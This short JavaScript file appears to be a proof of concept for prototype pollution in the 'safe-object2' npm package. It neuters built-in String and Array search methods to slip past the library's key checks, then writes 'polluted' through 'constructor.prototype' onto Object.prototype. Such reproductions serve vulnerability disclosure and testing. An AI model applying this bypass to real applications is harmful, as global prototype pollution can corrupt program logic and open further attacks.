String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
const safeObj2 = require('safe-object2');
const obj = safeObj2({});
console.log({}.polluted);
obj.setter([
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);